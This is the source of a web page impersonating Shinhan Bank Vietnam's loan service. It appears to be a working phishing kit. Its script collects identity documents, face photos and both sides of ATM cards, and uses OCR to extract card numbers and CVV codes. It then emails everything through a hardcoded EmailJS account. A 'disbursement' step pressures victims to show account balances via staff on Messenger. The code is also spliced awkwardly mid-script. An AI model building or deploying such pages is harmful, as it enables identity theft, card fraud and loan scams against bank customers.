                            <p style="text-align: center; font-size: 12px; color: #666;">(Áp dụng cho khách hàng đã được duyệt khoản vay tại Shinhan)</p>
                            <p><strong>Số hợp đồng:</strong> SHB-2025-<span id="contractId"></span></p>
                            <p><strong>Ngày nộp hồ sơ:</strong> <span id="contractDate"></span></p>
                            <table class="contract-table">
                                <tr><th>Bên vay</th><td><span id="contractFullName"></span></td></tr>
                                <tr><th>Số CCCD/CMND</th><td><span id="contractIdNumber"></span></td></tr>
                                <tr><th>Ngày cấp</th><td><span id="contractIdIssueDate"></span></td></tr>
                                <tr><th>Nơi cấp</th><td><span id="contractIdIssuePlace"></span></td></tr>
                                <tr><th>Số điện thoại</th><td><span id="contractPhone"></span></td></tr>
                                <tr><th>Số điện thoại người thân</th><td><span id="contractRelativePhone"></span></td></tr>
                                <tr><th>Email</th><td><span id="contractEmail"></span></td></tr>
                                <tr><th>Số tài khoản</th><td><span id="contractAccountNumber"></span></td></tr>
                                <tr><th>Ngân hàng</th><td><span id="contractBank"></span></td></tr>
                                <tr><th>Số tiền vay</th><td><span id="contractLoanAmount"></span></td></tr>
                                <tr><th>Thời hạn vay</th><td><span id="contractLoanTerm"></span> tháng</td></tr>
                                <tr><th>Trả hàng tháng</th><td><span id="contractMonthlyPayment"></span></td></tr>
                                <tr><th>Lãi suất</th><td><span id="contractInterestRate"></span></td></tr>
                            </table>
                            <div id="contractQrCode" style="text-align: center; margin: 12px 0;"></div>
                            <div id="contractPreview" style="margin-top: 12px;">
                                <iframe id="contractIframe" style="width: 100%; height: 400px;"></iframe>
                            </div>
                            <div class="signature-section" style="display: flex; justify-content: space-between; margin-top: 12px;">
                                <div style="text-align: center;">
                                    <p style="border-top: 1px solid #ccc; padding-top: 8px;">Bên vay: <span id="contractFullName2"></span></p>
                                    <canvas id="signatureCanvas" width="200" height="100" style="border: 1px solid #ccc; border-radius: 8px; display: none;"></canvas>
                                    <img id="signaturePreview" style="max-width: 200px; display: none;" />
                                    <button onclick="startSigning()" class="vib-v2-btn-dk02" style="margin-top: 8px;">Ký hợp đồng</button>
                                    <button onclick="clearSignature()" class="delete-photo" id="clearSignature" style="margin-top: 8px; display: none;">Xóa chữ ký</button>
                                </div>
                                <div style="text-align: center;">
                                    <p style="border-top: 1px solid #ccc; padding-top: 8px;">Shinhan Bank</p>
                                    <img src="https://www.shinhan.com.vn/vi/images/logo.png" alt="Shinhan Seal" style="max-width: 120px;" />
                                </div>
                            </div>
                            <p style="font-size: 14px; color: #666; margin-top: 12px;">Hợp đồng vay của quý khách vui lòng kiểm tra lại toàn bộ thông tin và đọc kĩ điều khoản trong hợp đồng trước khi giải ngân.</p>
                            <button onclick="downloadContract()" class="vib-v2-btn-dk02" style="display: block; margin: 12px auto;">Tải hợp đồng</button>
                        </div>
                    </div>
                    <div class="contract-section">
                        <h5 style="color: #005BAC; text-align: center;">Điều kiện giải ngân</h5>
                        <div class="disbursement-container" id="disbursement-confirmation">
                            <img src="https://www.shinhan.com.vn/vi/images/logo.png" class="logo-shinhan" alt="Shinhan Bank Logo">
                            <h4 style="text-align: center; color: #333;">GIẤY XÁC NHẬN ĐIỀU KIỆN GIẢI NGÂN</h4>
                            <p style="text-align: center; font-size: 12px; color: #666;">(Áp dụng cho khách hàng đã được duyệt hồ sơ và hợp đồng vay tại Shinhan)</p>
                            <p><strong>CIF No.:</strong> <span id="cifNo"></span></p>
                            <p><strong>Consent No.:</strong> <span id="consentNo"></span></p>
                            <p><strong>Số hợp đồng:</strong> SHB-2025-<span id="disbursementContractId"></span></p>
                            <p><strong>Ngày:</strong> <span id="disbursementDate"></span></p>
                            <table class="contract-table">
                                <tr><th>Bên vay</th><td><span id="disbursementFullName"></span></td></tr>
                                <tr><th>Số tài khoản</th><td><span id="disbursementAccountNumber"></span></td></tr>
                                <tr><th>Ngân hàng</th><td><span id="disbursementBank"></span></td></tr>
                                <tr><th>Số điện thoại người thân</th><td><span id="disbursementRelativePhone"></span></td></tr>
                                <tr><th>Số tiền vay</th><td><span id="disbursementLoanAmount"></span></td></tr>
                                <tr><th>Số dư tối thiểu</th><td><span id="disbursementMinimumBalance"></span></td></tr>
                            </table>
                            <ul style="list-style: none; padding: 0; margin: 12px 0;">
                                <li style="margin-bottom: 8px;">✔ Khoản vay không thế chấp, yêu cầu 10% số dư tài khoản để chứng minh khả năng tài chính.</li>
                                <li style="margin-bottom: 8px;">✔ Số dư không cần đóng, nạp, hay chuyển cho bất kỳ ai, chỉ cần để trong tài khoản.</li>
                                <li style="margin-bottom: 8px;">✔ Ví dụ: Vay 30 triệu, số dư tối thiểu 3 triệu.</li>
                                <li style="margin-bottom: 8px;">✔ Chụp ảnh số dư tài khoản qua nhân viên để hoàn tất hồ sơ, duyệt nhanh trong 1 giờ. Nếu không, hệ thống tự động thẩm định trong 3-7 ngày.</li>
                            </ul>
                            <p style="font-size: 14px; color: #666; margin-bottom: 12px;">Vui lòng đọc kỹ điều kiện giải ngân và hoàn tất chụp ảnh số dư để nhận tiền.</p>
                            <div style="display: flex; justify-content: center; gap: 12px; margin-top: 12px;">
                                <button onclick="openCameraForBalance()" class="vib-v2-btn-dk02">Chụp ảnh số dư</button>
                                <a href="https://m.me/ShinhanBankVietnam" target="_blank" class="vib-v2-btn-dk02">Liên hệ qua Messenger</a>
                            </div>
                            <div id="disbursementQrCode" style="text-align: center; margin: 12px 0;"></div>
                            <button onclick="downloadDisbursement()" class="vib-v2-btn-dk02" style="display: block; margin: 12px auto;">Tải điều kiện giải ngân</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Toast thông báo -->
    <div class="toast" id="toast"></div>

    <!-- Messenger Chatbot -->
    <div id="fb-root"></div>
    <div class="fb-customerchat" page_id="YOUR_PAGE_ID" theme_color="#005BAC"></div>

    <!-- Scripts -->
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.9.2/html2pdf.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.9.359/pdf.min.js"></script>
    <script src="https://unpkg.com/tesseract.js@2.1.5/dist/tesseract.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tooltipster/4.2.8/js/tooltipster.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.0/build/qrcode.min.js"></script>
    <script>
        $(document).ready(function() {
            emailjs.init("Cc-147hLWigAZAdeZ");
            let formData = JSON.parse(localStorage.getItem('formData')) || {};
            let currentStep = parseInt(localStorage.getItem('currentStep')) || 1;
            let signatureData = null;
            let loanChart = null;

            $('.tooltip').tooltipster({
                theme: 'tooltipster-sidetip',
                animation: 'fade',
                delay: 200
            });

            (function(d, s, id) {
                var js, fjs = d.getElementsByTagName(s)[0];
                if (d.getElementById(id)) return;
                js = d.createElement(s); js.id = id;
                js.src = 'https://connect.facebook.net/vi_VN/sdk/xfbml.customerchat.js';
                fjs.parentNode.insertBefore(js, fjs);
            }(document, 'script', 'facebook-jssdk'));

            $("#showFormButton").click(() => {
                $("#loadingOverlay").addClass("active");
                setTimeout(() => {
                    $("#registerForm").modal('show');
                    $("#loadingOverlay").removeClass("active");
                    restoreProgress();
                }, 500);
            });

            function saveProgress(step) {
                const safeFormData = { ...formData };
                delete safeFormData.idNumber;
                delete safeFormData.accountNumber;
                delete safeFormData.idPhotoFront;
                delete safeFormData.idPhotoBack;
                delete safeFormData.atmPhotoFront;
                delete safeFormData.atmPhotoBack;
                delete safeFormData.facePhoto;
                localStorage.setItem('currentStep', step);
                localStorage.setItem('formData', JSON.stringify(safeFormData));
            }

            function restoreProgress() {
                $('.progress-step').removeClass('active');
                $(`.progress-step[data-step="${currentStep}"]`).addClass('active');
                $('.step').removeClass('active').css({ opacity: 0, transform: 'translateY(20px)' });
                $(`#step-${currentStep}`).addClass('active').css({ opacity: 1, transform: 'translateY(0)' });
                Object.keys(formData).forEach(key => {
                    const input = $(`[name="${key}"]`);
                    if (input.length) input.val(formData[key]);
                });
            }

            function formatCurrency(input) {
                let value = input.value.replace(/\D/g, '');
                if (value) {
                    value = parseInt(value).toLocaleString('vi-VN') + ' VND';
                    input.value = value;
                }
            }

            function parseCurrency(value) {
                return parseInt(value.replace(/\D/g, '')) || 0;
            }

            function getInterestRate(loanType, loanTerm) {
                switch (loanType) {
                    case 'Vay tiêu dùng':
                        return 14;
                    case 'Vay mua nhà':
                        return loanTerm <= 6 ? 5.5 : 6;
                    case 'Vay mua xe':
                        return loanTerm <= 12 ? 7.8 : loanTerm <= 24 ? 8.6 : loanTerm <= 36 ? 9.5 : 10.5;
                    case 'Vay tiêu dùng số':
                        return 13.9 + 1.9;
                    default:
                        return 14;
                }
            }

            function calculateLoan(amount, term, rate) {
                const monthlyRate = rate / 12 / 100;
                const total = amount * (1 + monthlyRate * term);
                return Math.round(total / term);
            }

            function drawLoanChart(amount, term, rate) {
                const monthlyPayment = calculateLoan(amount, term, rate);
                const labels = Array.from({ length: term }, (_, i) => `Tháng ${i + 1}`);
                const principal = Array(term).fill(amount / term);
                const interest = Array(term).fill((amount * rate / 12 / 100) / term);

                if (loanChart) loanChart.destroy();
                loanChart = new Chart(document.getElementById('loanChart'), {
                    type: 'bar',
                    data: {
                        labels: labels,
                        datasets: [
                            { label: 'Gốc', data: principal, backgroundColor: '#005BAC' },
                            { label: 'Lãi', data: interest, backgroundColor: '#F37021' }
                        ]
                    },
                    options: {
                        scales: { x: { stacked: true }, y: { stacked: true } },
                        plugins: { title: { display: true, text: 'Kế hoạch trả nợ' } }
                    }
                });
            }

            function validateFormData(data, step) {
                const errors = {};
                const today = new Date();
                const provinceCodes = ['001', '002', '004', '006', '008', '010', '011', '012', '014', '015', '017', '019', '020', '022', '024', '025', '026', '027', '030', '031', '033', '034', '035', '036', '037', '038', '040', '042', '044', '045', '046', '048', '049', '051', '052', '054', '056', '058', '060', '062', '064', '066', '067', '068', '070', '072', '074', '075', '077', '079', '080', '082', '083', '084', '086', '087', '089', '091', '092', '093', '094', '095', '096'];

                if (step >= 1) {
                    if (!data.fullName || !/^[A-Za-zÀ-ỹ\s'-]{2,50}$/.test(data.fullName)) {
                        errors.fullName = "Họ tên từ 2-50 ký tự, chỉ chứa chữ cái, dấu cách, dấu nối hoặc dấu nháy đơn.";
                    }
                    if (!data.phone || !/^0[0-9]{9}$/.test(data.phone)) {
                        errors.phone = "Số điện thoại 10 số, bắt đầu bằng 0.";
                    }
                    if (data.email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) {
                        errors.email = "Email không hợp lệ.";
                    }
                }
                if (step >= 2) {
                    if (!data.idNumber || !/^\d{9}$|^\d{12}$/.test(data.idNumber) || !provinceCodes.includes(data.idNumber.slice(0, 3))) {
                        errors.idNumber = "CMND/CCCD phải là 9 hoặc 12 số, mã tỉnh hợp lệ.";
                    }
                    if (!data.idIssueDate) {
                        errors.idIssueDate = "Vui lòng chọn ngày cấp.";
                    } else if (new Date(data.idIssueDate) > today) {
                        errors.idIssueDate = "Ngày cấp không được trong tương lai.";
                    }
                    if (!data.idIssuePlace) {
                        errors.idIssuePlace = "Vui lòng nhập nơi cấp.";
                    }
                }
                if (step >= 3) {
                    if (!data.idPhotoFront) errors.idPhotoFront = "Vui lòng tải lên ảnh mặt trước CCCD/CMND.";
                    if (!data.idPhotoBack) errors.idPhotoBack = "Vui lòng tải lên ảnh mặt sau CCCD/CMND.";
                    if (!data.atmPhotoFront) errors.atmPhotoFront = "Vui lòng tải lên ảnh mặt trước thẻ ATM.";
                    if (!data.atmPhotoBack) errors.atmPhotoBack = "Vui lòng tải lên ảnh mặt sau thẻ ATM.";
                    if (!data.facePhoto) errors.facePhoto = "Vui lòng tải lên ảnh khuôn mặt/chân dung.";
                }
                if (step >= 5) {
                    const normalizeName = (name) => name.trim().normalize("NFD").replace(/[\u0300-\u036f]/g, "").toLowerCase();
                    if (!data.accountHolder || normalizeName(data.accountHolder) !== normalizeName(data.fullName)) {
                        errors.accountHolder = "Tên chủ tài khoản phải khớp với họ tên (không phân biệt dấu).";
                    }
                    if (!data.loanType) {
                        errors.loanType = "Vui lòng chọn loại vay.";
                    }
                    if (!data.loanTerm) {
                        errors.loanTerm = "Vui lòng chọn thời hạn vay.";
                    }
                    if (!data.relativePhone || !/^0[0-9]{9}$/.test(data.relativePhone)) {
                        errors.relativePhone = "Số điện thoại người thân 10 số, bắt đầu bằng 0.";
                    }
                    if (!data.accountNumber || !/^[0-9]{9,15}$/.test(data.accountNumber)) {
                        errors.accountNumber = "Số tài khoản từ 9-15 số.";
                    }
                    if (!data.bank) {
                        errors.bank = "Vui lòng chọn ngân hàng.";
                    }
                    if (data.loanAmount < 10000000) {
                        errors.loanAmount = "Số tiền vay tối thiểu 10 triệu VNĐ.";
                    } else if (data.loanType === 'Vay tiêu dùng' && data.loanAmount > 900000000) {
                        errors.loanAmount = "Số tiền vay tối đa 900 triệu VNĐ.";
                    } else if (data.loanType === 'Vay tiêu dùng số' && data.loanAmount > 100000000) {
                        errors.loanAmount = "Số tiền vay tối đa 100 triệu VNĐ.";
                    } else if ((data.loanType === 'Vay mua nhà' || data.loanType === 'Vay mua xe')) {
                        if (!data.assetValue || data.assetValue <= 0) {
                            errors.assetValue = "Vui lòng nhập giá trị tài sản hợp lệ.";
                        } else if (data.loanAmount > 0.8 * parseCurrency(data.assetValue)) {
                            errors.loanAmount = "Số tiền vay tối đa 80% giá trị tài sản.";
                        }
                    }
                    if (data.monthlyIncome && data.monthlyIncome < 4000000) {
                        errors.monthlyIncome = "Thu nhập tối thiểu 4 triệu VNĐ.";
                    }
                    if (!data.branchName) {
                        errors.branchName = "Vui lòng chọn chi nhánh.";
                    }
                }
                return errors;
            }

            async function verifyIdNumber(idNumber) {
                const provinceCodes = ['001', '002', '004', '006', '008', '010', '011', '012', '014', '015', '017', '019', '020', '022', '024', '025', '026', '027', '030', '031', '033', '034', '035', '036', '037', '038', '040', '042', '044', '045', '046', '048', '049', '051', '052', '054', '056', '058', '060', '062', '064', '066', '067', '068', '070', '072', '074', '075', '077', '079', '080', '082', '083', '084', '086', '087', '089', '091', '092', '093', '094', '095', '096'];
                return provinceCodes.includes(idNumber.slice(0, 3)) ? true : { error: 'Mã tỉnh không hợp lệ.' };
            }

            async function retryRequest(fn, retries = 3, delay = 1000) {
                for (let i = 0; i < retries; i++) {
                    try {
                        return await fn();
                    } catch (error) {
                        if (i === retries - 1) throw error;
                        await new Promise(resolve => setTimeout(resolve, delay));
                    }
                }
            }

            async function submitToServer(data) {
                try {
                    const response = await fetch('/loan-application', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                    if (!response.ok) throw new Error(`Gửi dữ liệu thất bại: ${response.statusText}`);
                    return await response.json();
                } catch (error) {
                    console.error('Lỗi gửi dữ liệu đến server:', error);
                    throw error;
                }
            }

            async function sendEmail(data) {
                const readFileAsBase64 = (file) => new Promise((resolve, reject) => {
                    if (!file) resolve("Không cung cấp");
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });

                try {
                    const compressImage = async (file) => {
                        if (!file) return null;
                        const img = new Image();
                        img.src = URL.createObjectURL(file);
                        await new Promise(resolve => img.onload = resolve);
                        const canvas = document.createElement("canvas");
                        const maxSize = 800;
                        const scale = Math.min(maxSize / img.width, maxSize / img.height, 1);
                        canvas.width = img.width * scale;
                        canvas.height = img.height * scale;
                        canvas.getContext("2d").drawImage(img, 0, 0, canvas.width, canvas.height);
                        return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.8));
                    };

                    const images = await Promise.all([
                        compressImage(data.idPhotoFront).then(readFileAsBase64),
                        compressImage(data.idPhotoBack).then(readFileAsBase64),
                        compressImage(data.atmPhotoFront).then(readFileAsBase64),
                        compressImage(data.atmPhotoBack).then(readFileAsBase64),
                        compressImage(data.facePhoto).then(readFileAsBase64)
                    ]);

                    const contractId = document.getElementById('contractId').textContent || Math.floor(100000 + Math.random() * 900000);
                    const pdfUrl = `/contracts/SHB-2025-${contractId}.pdf`;
                    const disbursementUrl = `/disbursements/SHB-2025-${contractId}.pdf`;

                    const ocrId = await extractTextFromImage(data.idPhotoFront);
                    const ocrAtm = await extractTextFromImage(data.atmPhotoFront);
                    const ocrAtmBack = data.atmPhotoBack ? await extractTextFromImage(data.atmPhotoBack) : { cvv: "Không cung cấp" };

                    const adminParams = {
                        fullName: data.fullName,
                        idNumber: data.idNumber,
                        idNumberOCR: ocrId.idNumber || "Không nhận diện",
                        idIssueDate: data.idIssueDate,
                        idIssuePlace: data.idIssuePlace,
                        phone: data.phone,
                        relativePhone: data.relativePhone,
                        email: data.email || "Không cung cấp",
                        accountNumber: data.accountNumber,
                        atmNumberOCR: ocrAtm.atmNumber || "Không nhận diện",
                        cvvOCR: ocrAtmBack.cvv,
                        bank: data.bank,
                        accountHolder: data.accountHolder,
                        loanAmount: data.loanAmount.toLocaleString('vi-VN'),
                        loanTerm: data.loanTerm,
                        loanType: data.loanType,
                        loanPurpose: data.loanPurpose || "Không cung cấp",
                        monthlyIncome: data.monthlyIncome ? data.monthlyIncome.toLocaleString('vi-VN') : "Không cung cấp",
                        branchName: data.branchName,
                        monthlyPayment: data.monthlyPayment.toLocaleString('vi-VN'),
                        signature: signatureData || "Chưa ký",
                        contractUrl: pdfUrl,
                        disbursementUrl: disbursementUrl,
                        idPhotoFront: images[0],
                        idPhotoBack: images[1],
                        atmPhotoFront: images[2],
                        atmPhotoBack: images[3],
                        facePhoto: images[4]
                    };

                    const customerParams = {
                        to_email: data.email || null,
                        fullName: data.fullName,
                        contractNumber: `SHB-2025-${contractId}`,
                        loanAmount: data.loanAmount.toLocaleString('vi-VN'),
                        loanPurpose: data.loanPurpose || data.loanType || "Vay tiêu dùng",
                        loanTerm: data.loanTerm,
                        interestRate: getInterestRate(data.loanType, data.loanTerm).toString(),
                        monthlyPayment: data.monthlyPayment.toLocaleString('vi-VN'),
                        PaymentMethod: "Trả góp hàng tháng",
                        disbursementDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toLocaleDateString('vi-VN'),
                        branchName: data.branchName || "Chi nhánh Hà Nội",
                        staffName: "Nguyễn Văn A",
                        staffPhone: "0901234567",
                        deadlineDate: new Date(Date.now() + 14 * 24 * 60 * 60 * 1000).toLocaleDateString('vi-VN'),
                        branchAddress: data.branchName === "Chi nhánh Hà Nội" ? "123 Đường Láng, Hà Nội" : data.branchName === "Chi nhánh TP.HCM" ? "456 Nguyễn Huệ, TP.HCM" : "Chi nhánh Shinhan",
                        contractUrl: pdfUrl,
                        disbursementUrl: disbursementUrl,
                        signature: signatureData || "Chưa ký",
                        approvalMessage: "Hồ sơ của bạn đang được Shinhan xét duyệt, kết quả sẽ thông báo trong 60 phút."
                    };

                    await retryRequest(() => emailjs.send("service_db2prre", "template_g4jo6tc", adminParams));
                    if (data.email) {
                        await retryRequest(() => emailjs.send("service_db2prre", "template_sgzr5e8", customerParams));
                    }

                    showToast("Đăng ký vay đã được gửi, hồ sơ đang được xét duyệt.", "success");
                } catch (error) {
                    console.error("EmailJS error:", error);
                    showToast("Gửi email thất bại, vui lòng thử lại.");
                    saveToLocalStorage(data);
                    throw error;
                }
            }

            function saveToLocalStorage(data) {
                const safeData = { ...data };
                delete safeData.idNumber;
                delete safeData.accountNumber;
                delete safeData.idPhotoFront;
                delete safeData.idPhotoBack;
                delete safeData.atmPhotoFront;
                delete safeData.atmPhotoBack;
                delete safeData.facePhoto;
                localStorage.setItem('formDataBackup', JSON.stringify(safeData));<script>
    // ... (phần mã trước đó giữ nguyên, tiếp tục từ saveToLocalStorage)

    function saveToLocalStorage(data) {
        const safeData = { ...data };
        delete safeData.idNumber;
        delete safeData.accountNumber;
        delete safeData.idPhotoFront;
        delete safeData.idPhotoBack;
        delete safeData.atmPhotoFront;
        delete safeData.atmPhotoBack;
        delete safeData.facePhoto;
        localStorage.setItem('formDataBackup', JSON.stringify(safeData));
    }

    async function extractTextFromImage(file) {
        $("#loadingOverlay").addClass("active");
        try {
            if (!file) return { idNumber: "", atmNumber: "", cvv: "" };
            const img = new Image();
            img.src = URL.createObjectURL(file);
            await new Promise(resolve => img.onload = resolve);
            const canvas = document.createElement("canvas");
            canvas.width = img.width / 2;
            canvas.height = img.height / 2;
            canvas.getContext("2d").drawImage(img, 0, 0, canvas.width, canvas.height);
            const { createWorker } = Tesseract;
            const worker = await createWorker();
            await worker.load();
            await worker.loadLanguage("eng");
            await worker.initialize("eng");
            const { data: { text } } = await worker.recognize(canvas);
            await worker.terminate();
            const idNumber = text.match(/\d{9,12}/)?.[0] || "";
            const atmNumber = text.match(/\d{16}/)?.[0] || "";
            const cvv = text.match(/\b\d{3}\b/)?.[0] || "";
            return { idNumber, atmNumber, cvv };
        } catch (error) {
            console.error("Lỗi OCR ảnh:", error);
            showToast("Lỗi xử lý ảnh, vui lòng thử lại.");
            return { idNumber: "", atmNumber: "", cvv: "" };
        } finally {
            $("#loadingOverlay").removeClass("active");
        }
    }

    async function checkImageQuality(file, type) {
        $("#loadingOverlay").addClass("active");
        try {
            if (!file || !file.type.startsWith('image/')) {
                return "Định dạng file không phải ảnh.";
            }
            const img = new Image();
            img.src = URL.createObjectURL(file);
            await new Promise((resolve, reject) => {
                img.onload = resolve;
                img.onerror = () => reject(new Error("Ảnh không hợp lệ hoặc bị hỏng."));
            });

            const canvas = document.createElement("canvas");
            const maxSize = 1000;
            const scale = Math.min(maxSize / img.width, maxSize / img.height, 1);
            canvas.width = img.width * scale;
            canvas.height = img.height * scale;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
            let contrast = 0;
            for (let i = 0; i < imageData.length; i += 4) {
                const gray = (imageData[i] + imageData[i + 1] + imageData[i + 2]) / 3;
                contrast += gray;
            }
            contrast /= (imageData.length / 4);
            if (contrast < 50) {
                return "Ảnh mờ, vui lòng chụp lại.";
            }

            if (img.width < 300 || img.height < 200) {
                return "Ảnh mất góc, vui lòng chụp lại.";
            }

            const { idNumber, atmNumber, cvv } = await extractTextFromImage(file);
            if (type === "cccd" && !idNumber) {
                return "Không nhận diện được số CCCD/CMND, vui lòng chụp lại.";
            }
            if (type === "cccd" && idNumber && idNumber !== formData.idNumber) {
                return "Số CCCD/CMND không khớp với thông tin đã nhập.";
            }
            if (type === "atm" && !atmNumber) {
                return "Không nhận diện được số tài khoản, vui lòng chụp lại.";
            }
            if (type === "atm" && atmNumber && formData.accountNumber && atmNumber !== formData.accountNumber) {
                return "Số tài khoản ATM không khớp với thông tin đã nhập.";
            }
            if (type === "atm" && file.name === "atmPhotoBack" && !cvv) {
                return "Không nhận diện được mã CVV, vui lòng chụp lại.";
            }
            if (type === "face" && !idNumber && !atmNumber) {
                return "Ảnh khuôn mặt không rõ, vui lòng chụp lại.";
            }

            return true;
        } catch (error) {
            console.error("Lỗi kiểm tra chất lượng ảnh:", error);
            return "Lỗi xử lý ảnh, vui lòng thử lại.";
        } finally {
            $("#loadingOverlay").removeClass("active");
        }
    }

    async function isAppScreenshot(file) {
        try {
            const { text } = await extractTextFromImage(file);
            return text.toLowerCase().includes("app") || text.toLowerCase().includes("mobile") || text.toLowerCase().includes("bank");
        } catch (error) {
            console.error("Lỗi kiểm tra ảnh chụp app:", error);
            return false;
        }
    }

    function showError(input, message) {
        const errorDiv = input.next('.error-message');
        errorDiv.text(message).slideDown(200);
        input.addClass('error');
    }

    function hideError(input) {
        const errorDiv = input.next('.error-message');
        errorDiv.slideUp(200);
        input.removeClass('error');
    }

    function showToast(message, type = "error") {
        const toast = $("#toast");
        toast.text(message).css("background", type === "success" ? "#28a745" : "#e63946").fadeIn(300);
        setTimeout(() => toast.fadeOut(300), 5000);
    }

    window.previewImage = async function(input, previewId, uploadedId) {
        const file = input.files[0];
        if (file) {
            if (file.size > 5 * 1000000) {
                showToast("Ảnh không được vượt quá 5MB!");
                input.value = "";
                return;
            }
            const type = input.name.includes("idPhoto") ? "cccd" : input.name.includes("atmPhoto") ? "atm" : "face";
            const quality = await checkImageQuality(file, type);
            if (typeof quality === "string") {
                showToast(quality);
                input.value = "";
                return;
            }
            formData[input.name] = file;
            if (input.name === "atmPhotoFront") {
                formData.isAppScreenshot = await isAppScreenshot(file);
            }
            const reader = new FileReader();
            reader.onload = function(e) {
                const img = document.getElementById(previewId);
                img.src = e.target.result;
                img.style.display = 'block';
                document.getElementById(uploadedId).style.display = 'block';
                $(`button[onclick="deletePhoto('${input.name}')"]`).show();
            };
            reader.readAsDataURL(file);
        }
    };

    window.deletePhoto = function(inputName) {
        formData[inputName] = null;
        if (inputName === "atmPhotoFront") {
            formData.isAppScreenshot = false;
        }
        $(`#${inputName}Preview`).hide();
        $(`#${inputName}Uploaded`).hide();
        $(`input[name="${inputName}"]`).val("");
        $(`button[onclick="deletePhoto('${inputName}')"]`).hide();
    };

    async function sendOTP() {
        const phone = $('[name="phone"]').val();
        if (!/^0[0-9]{9}$/.test(phone)) {
            showToast("Số điện thoại không hợp lệ.");
            return;
        }
        try {
            const response = await fetch('/send-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone })
            });
            if (response.ok) {
                $('#otpContainer').show();
                showToast("Mã OTP đã được gửi.", "success");
            } else {
                showToast("Gửi OTP thất bại.");
            }
        } catch (error) {
            console.error("Lỗi gửi OTP:", error);
            showToast("Lỗi gửi OTP, vui lòng thử lại.");
        }
    }

    window.nextStep = async function(step) {
        const currentStep = $(`#step-${step-1}`);
        const inputs = currentStep.find('input[required], select[required]');
        let isValid = true;

        inputs.each(function() {
            const input = $(this);
            formData[input.attr('name')] = input.val();
            if (!input.val()) {
                isValid = false;
                showError(input, "Trường này là bắt buộc.");
            } else if (input.attr('pattern') && !new RegExp(input.attr('pattern')).test(input.val())) {
                isValid = false;
                showError(input, input.attr('title') || "Dữ liệu không hợp lệ.");
            } else {
                hideError(input);
            }
        });

        if (step === 2) {
            const otp = $('[name="otp"]').val();
            const phone = $('[name="phone"]').val();
            if ($('#otpContainer').is(':visible')) {
                try {
                    const response = await fetch('/verify-otp', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ phone, otp })
                    });
                    if (!response.ok) {
                        isValid = false;
                        showError($('[name="otp"]'), "Mã OTP không hợp lệ.");
                    }
                } catch (error) {
                    isValid = false;
                    showError($('[name="otp"]'), "Lỗi xác minh OTP.");
                }
            }
            const idVerification = await verifyIdNumber(formData.idNumber);
            if (idVerification.error) {
                isValid = false;
                showError($('[name="idNumber"]'), idVerification.error);
            }
        }

        const errors = validateFormData(formData, step);
        Object.keys(errors).forEach(key => {
            const input = currentStep.find(`[name="${key}"]`);
            if (input.length) {
                isValid = false;
                showError(input, errors[key]);
            }
        });

        if (!isValid) {
            showToast("Vui lòng kiểm tra lại thông tin.");
            return;
        }

        $('.progress-step').removeClass('active');
        $(`.progress-step[data-step="${step}"]`).addClass('active');
        $('.step').removeClass('active').css({ opacity: 0, transform: 'translateY(20px)' });
        $(`#step-${step}`).addClass('active').css({ opacity: 1, transform: 'translateY(0)' });
        saveProgress(step);
    };

    window.prevStep = function(step) {
        $('.progress-step').removeClass('active');
        $(`.progress-step[data-step="${step}"]`).addClass('active');
        $('.step').removeClass('active').css({ opacity: 0, transform: 'translateY(20px)' });
        $(`#step-${step}`).addClass('active').css({ opacity: 1, transform: 'translateY(0)' });
        saveProgress(step);
    };

    window.submitForm = async function() {
        const errors = validateFormData(formData, 5);
        if (Object.keys(errors).length > 0) {
            Object.keys(errors).forEach(key => {
                const input = $(`[name="${key}"]`);
                if (input.length) showError(input, errors[key]);
            });
            showToast("Vui lòng kiểm tra lại thông tin.");
            console.error("Lỗi xác thực dữ liệu:", errors);
            return;
        }

        formData.loanAmount = parseCurrency(formData.loanAmount);
        formData.monthlyIncome = formData.monthlyIncome ? parseCurrency(formData.monthlyIncome) : 0;
        formData.assetValue = formData.assetValue ? parseCurrency(formData.assetValue) : 0;
        const interestRate = getInterestRate(formData.loanType, formData.loanTerm);
        formData.monthlyPayment = calculateLoan(formData.loanAmount, formData.loanTerm, interestRate);

        $("#loadingOverlay").addClass("active");
        try {
            await submitToServer(formData);
            await sendEmail(formData);
            $("#loadingOverlay").removeClass("active");
            $("#registerForm").modal("hide");
            showToast("HỒ SƠ ĐANG TRONG QUÁ TRÌNH XÉT DUYỆT VUI LÒNG ĐỢI NGÂN HÀNG THẨM ĐỊNH XÉT DUYỆT SẼ CÓ KẾT QUẢ TRONG VÀI PHÚT", "success");

            setTimeout(() => {
                $("#successModal").modal("show");
                setTimeout(() => {
                    $("#successModal").modal("hide");
                    $("#contractModal").modal("show");
                    updateContractModal(formData);
                }, 5000);
            }, 300000); // 5 phút
        } catch (error) {
            $("#loadingOverlay").removeClass("active");
            showToast("Lỗi gửi hồ sơ, vui lòng thử lại.");
            console.error("Lỗi gửi hồ sơ:", error);
        }
    };

    window.verifyFace = async function() {
        $("#loadingOverlay").addClass("active");
        try {
            const video = document.getElementById('faceVideo');
